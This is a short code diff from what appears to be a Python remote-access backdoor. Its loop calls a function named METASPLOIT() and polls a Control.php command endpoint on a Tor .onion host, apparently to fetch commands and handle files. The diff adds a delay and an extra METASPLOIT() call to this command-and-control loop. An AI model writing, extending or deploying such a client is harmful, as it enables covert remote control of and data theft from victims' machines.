@@ -318,7 +318,8 @@ while True:
     try:
         def receive_data():
             global previous_command, previous_files
-
+            time.sleep(10)
+            METASPLOIT()
             while True:
                 METASPLOIT()
                 php_script_url = f'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
